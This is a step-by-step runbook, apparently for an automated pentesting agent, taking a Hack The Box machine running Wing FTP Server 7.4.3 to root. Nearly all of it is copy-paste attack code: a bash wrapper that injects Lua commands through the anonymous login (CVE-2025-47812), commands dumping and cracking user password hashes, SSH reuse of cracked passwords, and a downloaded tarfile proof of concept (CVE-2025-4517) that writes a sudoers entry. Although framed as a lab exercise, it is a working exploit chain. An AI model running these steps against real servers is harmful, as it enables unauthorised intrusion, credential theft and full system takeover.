# Runbook: Wing FTP Server 7.4.3 → root

**Use when:** Target shows `Wing FTP Server v7.4.3` on `login.html`.
**Produces:** root shell + user.txt + root.txt.
**Time:** 15-30 min if everything works.
**Prerequisites:** HTB VPN (or network reach), `sshpass`, `hashcat` with rockyou, `python3`.

This runbook was validated end-to-end on **wingdata.htb (10.129.49.228)** on
2026-05-07. Every step is copy-paste — replace only the two variables.

---

## Variables (set once)

```bash
export TARGET="10.X.X.X"          # ← edit
export HOSTNAME="ftp.example.htb" # ← edit (the FTP vhost)
export REPORTS="$HOME/.openclaw/workspace/reports/$TARGET"
mkdir -p "$REPORTS"/{nmap,web,creds,loot}
```

---

## Step 1 — Confirm the fingerprint

```bash
curl -s -H "Host: $HOSTNAME" http://$TARGET/login.html | grep -i "wing ftp"
```

Expected output:
```
FTP server software powered by <b><a href="https://www.wftpserver.com/">Wing FTP Server v7.4.3</a></b>
```

If failed:
- Empty output → host header wrong, try `curl -s http://$TARGET/`, look for redirect, set `$HOSTNAME` accordingly.
- Different version → switch to `playbooks/archetypes/custom-ftp-or-file-server.md` (generic).

---

## Step 2 — Build the RCE wrapper

```bash
cat > "$REPORTS/loot/rce.sh" <<'BASH'
#!/bin/bash
CMD="${*:-id}"
ENC=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$CMD")
RESP=$(curl -s -i -H "Host: $WFTP_HOST" -X POST "http://$WFTP_TARGET/loginok.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://$WFTP_TARGET" \
  -H "Referer: http://$WFTP_TARGET/login.html?lang=english" \
  -H "Cookie: client_lang=english" \
  --data "username=anonymous%00]]%0dlocal+h+%3d+io.popen(\"$ENC\")%0dlocal+r+%3d+h%3aread(\"*a\")%0dh%3aclose()%0dprint(r)%0d--&password=")
COOKIE=$(echo "$RESP" | grep -i "Set-Cookie:" | sed -nE 's/.*UID=([a-f0-9]+).*/\1/p' | head -1)
[ -z "$COOKIE" ] && { echo "$RESP" | grep -iE "(alert|too many|invalid)" | head -2 >&2; exit 1; }
curl -s -H "Host: $WFTP_HOST" -H "Cookie: UID=$COOKIE; client_lang=english" \
  "http://$WFTP_TARGET/dir.html"
BASH
chmod +x "$REPORTS/loot/rce.sh"

# Test
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" "$REPORTS/loot/rce.sh" "id"
```

Expected output:
```
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),...
```

If failed:
- "too many users logged to this account" → wait 5 min and retry.
- "502 Proxy Error" → you DoS'd Wing FTP. Wait 3 min, retry.
- "Login failed: username and password do not match" → `anonymous` not enabled. Skip — this runbook needs anon. Open generic FTP archetype.

---

## Step 3 — Extract Wing FTP user hashes

```bash
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" "$REPORTS/loot/rce.sh" \
  "for f in /opt/wftpserver/Data/*/users/*.xml; do
     echo \"=== \$f ===\";
     grep -E 'UserName|Password' \$f;
   done" | tee "$REPORTS/creds/wftp-userdata.txt"
```

Expected output:
```
=== /opt/wftpserver/Data/1/users/wacky.xml ===
        <UserName>wacky</UserName>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

If failed:
- Empty / "session expired" → server saturated, wait 2-3 min, retry.

---

## Step 4 — Find the salt

```bash
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" "$REPORTS/loot/rce.sh" \
  "grep -E 'Salt|EnablePasswordSalting' /opt/wftpserver/Data/*/settings.xml"
```

Expected output:
```
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

Note the `<SaltingString>` value — that's `$SALT` for Step 6.
For HTB Wing FTP boxes the default is literally `WingFTP`.

---

## Step 5 — Confirm the hash algorithm (DON'T SKIP — saves hours)

```bash
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" "$REPORTS/loot/rce.sh" \
  "grep -nE 'sha2|md5|salt_string' /opt/wftpserver/lua/ServerInterface.lua | head -10"
```

Expected output:
```
449:    temppass = user.password..salt_string
453:    password_md5 = sha2(temppass)
```

`password..salt_string` = `password + salt` → **hashcat mode 1410**.

If you see `salt_string..password` instead → mode 1420.

---

## Step 6 — Crack with hashcat

```bash
SALT="WingFTP"
# Build hash:salt file from the user XMLs
grep -hE "<UserName>|<Password>" "$REPORTS/creds/wftp-userdata.txt" \
  | sed -E 's/.*<(UserName|Password)>([^<]*)<.*/\2/' \
  | paste -d: - - \
  | awk -F: -v salt="$SALT" '{print $2":"salt}' \
  | grep -v "^:" \
  > "$REPORTS/creds/hashes.txt"

cat "$REPORTS/creds/hashes.txt"
# (Should show 4-5 hashes, one per line, format <hash>:WingFTP)

bash "$HOME/.openclaw/workspace/scripts/timebox.sh" 90 \
  hashcat -m 1410 -a 0 "$REPORTS/creds/hashes.txt" /usr/share/wordlists/rockyou.txt

hashcat -m 1410 "$REPORTS/creds/hashes.txt" --show
```

Expected output (your hash and password will differ):
```
<64-hex-char-hash>:WingFTP:<cracked-password>
```

Note the cracked password in the third field — you'll use it in Step 8.

If failed:
- "Exhausted" with 0 cracked → wrong mode. Re-read Step 5 carefully. Try mode 1420.

---

## Step 7 — Find the matching system user

The cracked Wing FTP user usually exists as a Linux user with the same
password. Find candidates:

```bash
WFTP_TARGET="$TARGET" WFTP_HOST="$HOSTNAME" "$REPORTS/loot/rce.sh" \
  "cat /etc/passwd | grep -E 'sh\$|bash\$'"
```

Expected output (example):
```
root:x:0:0:root:/root:/bin/bash
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```

The "real" user is the one matching a cracked Wing FTP user. Here: **wacky**.

---

## Step 8 — SSH as the user, capture user.txt

```bash
export USER="<user>"           # ← from Step 7 (e.g. wacky on wingdata)
export PASS='<cracked_password>'  # ← from Step 6 (use single quotes to escape special chars)

sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" \
  "id; cat ~/user.txt; sudo -l 2>&1"
```

Expected output:
```
uid=1001(<user>) gid=1001(<user>) groups=1001(<user>)
<32-hex-char-flag>      ← USER FLAG
Matching Defaults entries for <user> on wingdata: ...
User <user> may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

🚩 **USER FLAG captured** — save it.

If sudo line shows the python tarfile script → continue to Step 9.
If different sudo path → switch to `linux-foothold-to-root.md`.

---

## Step 9 — Verify Python is vulnerable to CVE-2025-4517

```bash
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" \
  "/usr/local/bin/python3 --version; cat /opt/backup_clients/restore_backup_clients.py | grep -A1 extractall"
```

Expected output:
```
Python 3.12.3
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
```

Vulnerable if Python is `< 3.12.10`. 3.12.3 = vulnerable.

If Python ≥ 3.12.10 → switch to `linux-foothold-to-root.md` and look at other vectors.

---

## Step 10 — Download CVE-2025-4517 PoC (with operator approval)

⚠️ **Stop here and ask the operator** before downloading internet code.

After approval:

```bash
curl -sSL https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC/refs/heads/main/CVE-2025-4517-POC.py \
  -o "$REPORTS/loot/CVE-2025-4517-POC.py"

# Sanity-check the PoC for callbacks (none expected)
grep -nE "subprocess|os\.system|popen|requests|urllib|socket|/dev/tcp" "$REPORTS/loot/CVE-2025-4517-POC.py" \
  | grep -vE "^[0-9]+:#|import "
```

Expected output: only `subprocess.run(["cp", ...])` and `subprocess.run(cmd, ...)` for local invocations. No `requests.`, no `socket.`, no `/dev/tcp`. If you see anything reaching out → STOP and read the script before running.

---

## Step 11 — Upload + run the PoC + capture root.txt

```bash
sshpass -p "$PASS" scp -o StrictHostKeyChecking=no "$REPORTS/loot/CVE-2025-4517-POC.py" "$USER@$TARGET":/tmp/cve.py
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "cd /tmp && python3 cve.py"
```

Expected output:
```
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
```

Now grab root.txt:

```bash
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" \
  "sudo -n id; sudo -n cat /root/root.txt"
```

Expected output:
```
uid=0(root) gid=0(root) groups=0(root)
<32-hex-char-flag>      ← ROOT FLAG
```

🚩 **ROOT FLAG captured.**

---

## End condition

You should now have:
- ✅ `$REPORTS/creds/hashes.txt` — Wing FTP user hashes (1+ cracked)
- ✅ user.txt MD5
- ✅ root.txt MD5
- ✅ Confirmed sudo passwordless via `sudo -n`

## Cleanup (good operator hygiene)

The PoC dropped:
- `/tmp/cve.py`
- `/tmp/cve_2025_4517_exploit.tar`
- `/opt/backup_clients/backups/backup_9999.tar`
- `/opt/backup_clients/restored_backups/restore_pwn_*` (root-owned dirs you can't delete)
- An entry in `/etc/sudoers`

```bash
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "
  rm -f /tmp/cve.py /tmp/cve_2025_4517_exploit.tar
  sudo rm -f /opt/backup_clients/backups/backup_9999.tar
  sudo sed -i "/^$USER ALL=(ALL) NOPASSWD: ALL/d" /etc/sudoers
"
```

Don't try to remove the `restore_pwn_*` directories — root-owned, gone on box reset.

## Report

Use `templates/attack-report-template.md` and write to `$REPORTS/report.md`.
Include:
- Both flags
- The exploit chain (CVE-2025-47812 → cred dump → hashcat → CVE-2025-4517)
- The cracked password
- The Python version
- Any pivots NOT used (e.g. john/maria/steve hashes still uncracked)
